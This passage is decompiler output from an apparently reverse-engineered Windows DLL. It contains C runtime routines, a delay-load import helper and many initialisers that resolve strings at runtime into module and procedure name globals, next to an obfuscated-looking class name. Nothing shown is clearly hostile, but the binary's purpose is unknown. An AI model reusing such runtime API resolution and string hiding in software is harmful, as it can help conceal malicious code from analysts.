    || (v10 = (int (*)(void))_decode_pointer(dword_10038134),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))_decode_pointer(dword_10038138),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v18, 12, v19) && (v18[8] & 1) != 0 )
  {
    if ( dword_1003812C != v22 )
    {
      v14 = (int (*)(void))_decode_pointer(dword_1003812C);
      if ( v14 )
      {
        v23 = v14();
        if ( v23 )
        {
          if ( dword_10038130 != v22 )
          {
            v15 = (int (__stdcall *)(int))_decode_pointer(dword_10038130);
            if ( v15 )
              v23 = v15(v23);
          }
        }
      }
    }
  }
  else
  {
    if ( sub_10011B4C(&v20) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v20 < 4 )
      a3 |= 0x40000u;
    else
      a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))_decode_pointer(dword_10038128);
  if ( v16 )
    return v16(v23, a1, a2, a3);
  return 0;
}
// 1001141F: using guessed type _DWORD __cdecl _encode_pointer(_DWORD);
// 1001148D: using guessed type int _encoded_null(void);
// 10011496: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 10038128: using guessed type int dword_10038128;
// 1003812C: using guessed type int dword_1003812C;
// 10038130: using guessed type int dword_10038130;
// 10038134: using guessed type int dword_10038134;
// 10038138: using guessed type int dword_10038138;
// 10016D73: using guessed type char var_14[4];

//----- (10017D8F) --------------------------------------------------------
int sub_10017D8F()
{
  return flsall(1);
}
// 10017CB5: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (100195DF) --------------------------------------------------------
FARPROC __stdcall sub_100195DF(int *a1, int *Arguments)
{
  int *v2; // esi
  int v3; // ebx
  char *v4; // edi
  const CHAR *v5; // ecx
  char *v6; // ebx
  char *v7; // edx
  bool v8; // zf
  HMODULE LibraryA; // edi
  int v11; // edx
  const CHAR *v12; // eax
  FARPROC ProcAddress; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  int v16[3]; // [esp+Ch] [ebp-44h] BYREF
  LPCSTR lpLibFileName; // [esp+18h] [ebp-38h]
  BOOL v18; // [esp+1Ch] [ebp-34h]
  LPCSTR lpProcName; // [esp+20h] [ebp-30h]
  HMODULE v20; // [esp+24h] [ebp-2Ch]
  int (__stdcall *v21)(); // [esp+28h] [ebp-28h]
  DWORD LastError; // [esp+2Ch] [ebp-24h]
  volatile LONG *Target; // [esp+38h] [ebp-18h]
  char *v24; // [esp+44h] [ebp-Ch]
  int v25; // [esp+4Ch] [ebp-4h]

  v2 = a1;
  v3 = a1[3];
  v4 = (char *)&_ImageBase + a1[5];
  v5 = (char *)&_ImageBase + a1[1];
  Target = (volatile LONG *)((char *)&_ImageBase + a1[2]);
  v6 = (char *)&_ImageBase + v3;
  v7 = (char *)&_ImageBase + a1[4];
  v25 = a1[7];
  lpLibFileName = v5;
  v24 = v4;
  v16[2] = (int)Arguments;
  v8 = (*a1 & 1) == 0;
  v16[0] = 36;
  v16[1] = (int)a1;
  v18 = 0;
  lpProcName = 0;
  v20 = 0;
  v21 = 0;
  LastError = 0;
  if ( v8 )
  {
    Arguments = v16;
    RaiseException(0xC06D0057, 0, 1u, (const ULONG_PTR *)&Arguments);
    return 0;
  }
  LibraryA = (HMODULE)*Target;
  v11 = *(_DWORD *)&v7[4 * (((char *)Arguments - v6) >> 2)];
  a1 = (int *)(4 * (((char *)Arguments - v6) >> 2));
  v18 = v11 >= 0;
  v12 = (char *)&word_10000002 + v11;
  if ( v11 < 0 )
    v12 = (const CHAR *)(unsigned __int16)v11;
  lpProcName = v12;
  ProcAddress = 0;
  if ( !dword_1003822C || (ProcAddress = (FARPROC)dword_1003822C(0, v16)) == 0 )
  {
    if ( !LibraryA )
    {
      if ( !dword_1003822C || (LibraryA = (HMODULE)dword_1003822C(1, v16)) == 0 )
      {
        LibraryA = LoadLibraryA(lpLibFileName);
        if ( !LibraryA )
        {
          LastError = GetLastError();
          if ( !dword_10038228 || (LibraryA = (HMODULE)dword_10038228(3, v16)) == 0 )
          {
            Arguments = v16;
            RaiseException(0xC06D007E, 0, 1u, (const ULONG_PTR *)&Arguments);
            return v21;
          }
        }
      }
      if ( (HMODULE)InterlockedExchange(Target, (LONG)LibraryA) == LibraryA )
      {
        FreeLibrary(LibraryA);
      }
      else if ( v2[6] )
      {
        v14 = LocalAlloc(0x40u, 8u);
        if ( v14 )
        {
          v14[1] = v2;
          *v14 = dword_10038224;
          dword_10038224 = (int)v14;
        }
      }
    }
    v20 = LibraryA;
    if ( dword_1003822C )
      ProcAddress = (FARPROC)dword_1003822C(2, v16);
    if ( !ProcAddress )
    {
      if ( !v2[5]
        || !v2[7]
        || (v15 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15)), *v15 != 17744)
        || v15[2] != v25
        || LibraryA != (HMODULE)v15[13]
        || (ProcAddress = *(FARPROC *)&v24[(_DWORD)a1]) == 0 )
      {
        ProcAddress = GetProcAddress(LibraryA, lpProcName);
        if ( !ProcAddress )
        {
          LastError = GetLastError();
          if ( dword_10038228 )
            ProcAddress = (FARPROC)dword_10038228(4, v16);
          if ( !ProcAddress )
          {
            a1 = v16;
            RaiseException(0xC06D007F, 0, 1u, (const ULONG_PTR *)&a1);
            ProcAddress = v21;
          }
        }
      }
    }
    *Arguments = (int)ProcAddress;
  }
  if ( dword_1003822C )
  {
    LastError = 0;
    v20 = LibraryA;
    v21 = ProcAddress;
    dword_1003822C(5, v16);
  }
  return ProcAddress;
}
// 10000000: using guessed type __int16 _ImageBase;
// 10000002: using guessed type __int16 word_10000002;
// 10038224: using guessed type int dword_10038224;
// 10038228: using guessed type int (__stdcall *dword_10038228)(_DWORD, _DWORD);
// 1003822C: using guessed type int (__stdcall *dword_1003822C)(_DWORD, _DWORD);

//----- (10019D88) --------------------------------------------------------
int sub_10019D88()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001B71C);
  dword_10024220 = 0;
  dword_1002421C = result;
  return result;
}
// 1002421C: using guessed type int dword_1002421C;
// 10024220: using guessed type int dword_10024220;

//----- (10019DA0) --------------------------------------------------------
int sub_10019DA0()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001B758);
  dword_100241F0 = 0;
  dword_100241EC = result;
  return result;
}
// 100241EC: using guessed type int dword_100241EC;
// 100241F0: using guessed type int dword_100241F0;

//----- (10019DB8) --------------------------------------------------------
int sub_10019DB8()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001B77C);
  dword_100241FC = 0;
  dword_100241F8 = result;
  return result;
}
// 100241F8: using guessed type int dword_100241F8;
// 100241FC: using guessed type int dword_100241FC;

//----- (10019DD0) --------------------------------------------------------
int sub_10019DD0()
{
  int result; // eax

  dword_100241E0 = sub_1000C0E0((int)&unk_1001B7D0);
  result = sub_1000C0E0((int)&unk_1001B7AC);
  dword_100241E4 = result;
  return result;
}
// 100241E0: using guessed type int dword_100241E0;
// 100241E4: using guessed type int dword_100241E4;

//----- (10019DF2) --------------------------------------------------------
int sub_10019DF2()
{
  int result; // eax

  dword_10024228 = sub_1000C0E0((int)&unk_1001B82C);
  result = sub_1000C0E0((int)&unk_1001B808);
  dword_1002422C = result;
  return result;
}
// 10024228: using guessed type int dword_10024228;
// 1002422C: using guessed type int dword_1002422C;

//----- (10019E14) --------------------------------------------------------
int sub_10019E14()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001B868);
  dword_10024214 = 0;
  dword_10024210 = result;
  return result;
}
// 10024210: using guessed type int dword_10024210;
// 10024214: using guessed type int dword_10024214;

//----- (10019E2C) --------------------------------------------------------
int sub_10019E2C()
{
  int result; // eax

  dword_10024204 = sub_1000C0E0((int)&unk_1001B8D4);
  result = sub_1000C0E0((int)&unk_1001B8AC);
  dword_10024208 = result;
  return result;
}
// 10024204: using guessed type int dword_10024204;
// 10024208: using guessed type int dword_10024208;

//----- (10019E4E) --------------------------------------------------------
int sub_10019E4E()
{
  sub_10002DBA(dword_10026C18);
  return atexit(sub_1001A19A);
}
// 10026C18: using guessed type int dword_10026C18[4];

//----- (10019E64) --------------------------------------------------------
int sub_10019E64()
{
  sub_10002F8D(dword_10026C28);
  return atexit(sub_1001A1A4);
}
// 10026C28: using guessed type int dword_10026C28[4];

//----- (10019E7A) --------------------------------------------------------
int sub_10019E7A()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001BDC4);
  dword_10026C40 = 0;
  dword_10026C44 = 0;
  dword_10026C38 = result;
  dword_10026C3C = 1;
  return result;
}
// 10026C38: using guessed type int dword_10026C38;
// 10026C3C: using guessed type int dword_10026C3C;
// 10026C40: using guessed type int dword_10026C40;
// 10026C44: using guessed type int dword_10026C44;

//----- (10019EA3) --------------------------------------------------------
int sub_10019EA3()
{
  int result; // eax

  dword_10026C48 = sub_1000C0E0((int)&unk_1001CF90);
  dword_10026C4C = 1;
  dword_10026C50 = 0;
  dword_10026C54 = 0;
  dword_10026C58 = sub_1000C0E0((int)&unk_1001CF6C);
  dword_10026C5C = 1;
  dword_10026C60 = 0;
  dword_10026C64 = 0;
  result = sub_1000C0E0((int)&unk_1001CF54);
  dword_10026C70 = 0;
  dword_10026C74 = 0;
  dword_10026C6C = 1;
  dword_10026C68 = result;
  return result;
}
// 10026C48: using guessed type int dword_10026C48;
// 10026C4C: using guessed type int dword_10026C4C;
// 10026C50: using guessed type int dword_10026C50;
// 10026C54: using guessed type int dword_10026C54;
// 10026C58: using guessed type int dword_10026C58;
// 10026C5C: using guessed type int dword_10026C5C;
// 10026C60: using guessed type int dword_10026C60;
// 10026C64: using guessed type int dword_10026C64;
// 10026C68: using guessed type int dword_10026C68;
// 10026C6C: using guessed type int dword_10026C6C;
// 10026C70: using guessed type int dword_10026C70;
// 10026C74: using guessed type int dword_10026C74;

//----- (10019F15) --------------------------------------------------------
int sub_10019F15()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001CFB4);
  dword_10026C80 = 0;
  dword_10026C84 = 0;
  dword_10026C78 = result;
  dword_10026C7C = 1;
  return result;
}
// 10026C78: using guessed type int dword_10026C78;
// 10026C7C: using guessed type int dword_10026C7C;
// 10026C80: using guessed type int dword_10026C80;
// 10026C84: using guessed type int dword_10026C84;

//----- (10019F3E) --------------------------------------------------------
int sub_10019F3E()
{
  int result; // eax

  dword_10026C88 = sub_1000C0E0((int)&unk_1001D56C);
  dword_10026C8C = 1;
  dword_10026C90 = 0;
  dword_10026C94 = 0;
  dword_10026C98 = sub_1000C0E0((int)&unk_1001D548);
  dword_10026C9C = 1;
  dword_10026CA0 = 0;
  dword_10026CA4 = 0;
  dword_10026CA8 = sub_1000C0E0((int)&unk_1001D530);
  dword_10026CAC = 1;
  dword_10026CB0 = 0;
  dword_10026CB4 = 0;
  dword_10026CB8 = sub_1000C0E0((int)&unk_1001D510);
  dword_10026CBC = 1;
  dword_10026CC0 = 0;
  dword_10026CC4 = 0;
  dword_10026CC8 = sub_1000C0E0((int)&unk_1001D4EC);
  dword_10026CCC = 1;
  dword_10026CD0 = 0;
  dword_10026CD4 = 0;
  result = sub_1000C0E0((int)&unk_1001D4CC);
  dword_10026CE0 = 0;
  dword_10026CE4 = 0;
  dword_10026CDC = 1;
  dword_10026CD8 = result;
  return result;
}
// 10026C88: using guessed type int dword_10026C88;
// 10026C8C: using guessed type int dword_10026C8C;
// 10026C90: using guessed type int dword_10026C90;
// 10026C94: using guessed type int dword_10026C94;
// 10026C98: using guessed type int dword_10026C98;
// 10026C9C: using guessed type int dword_10026C9C;
// 10026CA0: using guessed type int dword_10026CA0;
// 10026CA4: using guessed type int dword_10026CA4;
// 10026CA8: using guessed type int dword_10026CA8;
// 10026CAC: using guessed type int dword_10026CAC;
// 10026CB0: using guessed type int dword_10026CB0;
// 10026CB4: using guessed type int dword_10026CB4;
// 10026CB8: using guessed type int dword_10026CB8;
// 10026CBC: using guessed type int dword_10026CBC;
// 10026CC0: using guessed type int dword_10026CC0;
// 10026CC4: using guessed type int dword_10026CC4;
// 10026CC8: using guessed type int dword_10026CC8;
// 10026CCC: using guessed type int dword_10026CCC;
// 10026CD0: using guessed type int dword_10026CD0;
// 10026CD4: using guessed type int dword_10026CD4;
// 10026CD8: using guessed type int dword_10026CD8;
// 10026CDC: using guessed type int dword_10026CDC;
// 10026CE0: using guessed type int dword_10026CE0;
// 10026CE4: using guessed type int dword_10026CE4;

//----- (1001A019) --------------------------------------------------------
const CHAR *sub_1001A019()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D774);
  lpModuleName = result;
  return result;
}

//----- (1001A02A) --------------------------------------------------------
const CHAR *sub_1001A02A()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D798);
  dword_10026CFC = result;
  return result;
}

//----- (1001A03B) --------------------------------------------------------
const CHAR *sub_1001A03B()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D7C0);
  dword_10026CE8 = result;
  return result;
}

//----- (1001A04C) --------------------------------------------------------
const CHAR *sub_1001A04C()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D7E4);
  dword_10026D00 = result;
  return result;
}

//----- (1001A05D) --------------------------------------------------------
const CHAR *sub_1001A05D()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D808);
  dword_10026D08 = result;
  return result;
}

//----- (1001A06E) --------------------------------------------------------
const CHAR *sub_1001A06E()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D838);
  lpLibFileName = result;
  return result;
}

//----- (1001A07F) --------------------------------------------------------
const CHAR *sub_1001A07F()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D858);
  lpProcName = result;
  return result;
}

//----- (1001A090) --------------------------------------------------------
const CHAR *sub_1001A090()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D87C);
  dword_10026CF8 = result;
  return result;
}

//----- (1001A0A1) --------------------------------------------------------
const CHAR *sub_1001A0A1()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001D8A0);
  dword_10026CEC = result;
  return result;
}

//----- (1001A0B2) --------------------------------------------------------
int sub_1001A0B2()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001D8C4);
  dword_10026CF0 = result;
  return result;
}
// 10026CF0: using guessed type int dword_10026CF0;

//----- (1001A0C3) --------------------------------------------------------
int sub_1001A0C3()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001D8E8);
  dword_10026D18 = 0;
  dword_10026D1C = 0;
  dword_10026D10 = result;
  dword_10026D14 = 1;
  return result;
}
// 10026D10: using guessed type int dword_10026D10;
// 10026D14: using guessed type int dword_10026D14;
// 10026D18: using guessed type int dword_10026D18;
// 10026D1C: using guessed type int dword_10026D1C;

//----- (1001A0EC) --------------------------------------------------------
int sub_1001A0EC()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001D90C);
  dword_10026D28 = 0;
  dword_10026D2C = 0;
  dword_10026D20 = result;
  dword_10026D24 = 1;
  return result;
}
// 10026D20: using guessed type int dword_10026D20;
// 10026D24: using guessed type int dword_10026D24;
// 10026D28: using guessed type int dword_10026D28;
// 10026D2C: using guessed type int dword_10026D2C;

//----- (1001A115) --------------------------------------------------------
int sub_1001A115()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001D930);
  dword_10026D38 = 0;
  dword_10026D3C = 0;
  dword_10026D30 = result;
  dword_10026D34 = 1;
  return result;
}
// 10026D30: using guessed type int dword_10026D30;
// 10026D34: using guessed type int dword_10026D34;
// 10026D38: using guessed type int dword_10026D38;
// 10026D3C: using guessed type int dword_10026D3C;

//----- (1001A13E) --------------------------------------------------------
int sub_1001A13E()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001E5D4);
  dword_10026D48 = 0;
  dword_10026D4C = 0;
  dword_10026D40 = result;
  dword_10026D44 = 1;
  return result;
}
// 10026D40: using guessed type int dword_10026D40;
// 10026D44: using guessed type int dword_10026D44;
// 10026D48: using guessed type int dword_10026D48;
// 10026D4C: using guessed type int dword_10026D4C;

//----- (1001A167) --------------------------------------------------------
const CHAR *sub_1001A167()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_1000C0E0((int)&unk_1001ED7C);
  dword_1003772C = result;
  return result;
}

//----- (1001A178) --------------------------------------------------------
int sub_1001A178()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001F018);
  dword_10037734 = result;
  return result;
}
// 10037734: using guessed type int dword_10037734;

//----- (1001A189) --------------------------------------------------------
int sub_1001A189()
{
  int result; // eax

  result = sub_1000C0E0((int)&unk_1001EFF4);
  dword_10037730 = result;
  return result;
}
// 10037730: using guessed type int dword_10037730;

//----- (1001A19A) --------------------------------------------------------
void __cdecl sub_1001A19A()
{
  sub_10002DE9(dword_10026C18);
}
// 10026C18: using guessed type int dword_10026C18[4];

//----- (1001A1A4) --------------------------------------------------------
void __cdecl sub_1001A1A4()
{
  sub_10002FBC(dword_10026C28);
}
// 10026C28: using guessed type int dword_10026C28[4];

//----- (1001A1AE) --------------------------------------------------------
void __cdecl sub_1001A1AE()
{
  dword_1003774C[0] = &ikc::izq_ezibc::`vftable';
  sub_10012D5A(dword_1003774C);
}
